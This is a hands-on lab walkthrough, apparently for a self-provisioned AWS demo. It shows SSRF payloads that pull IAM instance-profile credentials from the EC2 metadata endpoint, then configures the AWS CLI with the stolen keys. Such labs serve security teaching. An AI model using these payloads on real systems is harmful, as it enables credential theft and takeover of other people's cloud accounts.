1.  From the console, locate the ec2 instance that was provisioned.

2.  In a seperate browser window, navigate to the web service hosted by the ec2 instance.  

You can find the public IP by clicking on the instance, and going to `Details`, then `Public IPv4 address`.

<b> Make sure that you change the url to use http, as that is how we have configured our security group. 

```script
 http://<public_ipv4_address>/
```

We can see that the web server is running, but it looks like it's expecting a query string.  We need to construct an SSRF payload.

3.  First, let's look at some of the metadata categories available:

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/
```

These are all categories of information that the ec2 instance would be able to access during it's day to day actions.

4.  By navigating through the API structure, we can eventually get to credentials.  Paste each url into your browser to work through the API directory structure.  

The instance profile name will be unique to each environment. 

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{name-of-your-instance-profile}
```

5.  These are the credentials of the instance profile that is being used by the ec2 instance.  By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  

Copy the value of `AccessKeyId` and `SecretAccessKey`, and use it to configure a profile called `ssrf-demo`.

```script
    aws configure --profile ssrf-demo
```

Check that the profile has been configured correctly by executing a get-caller-identity API call.

```script
    aws sts get-caller-identity --profile ssrf-demo
```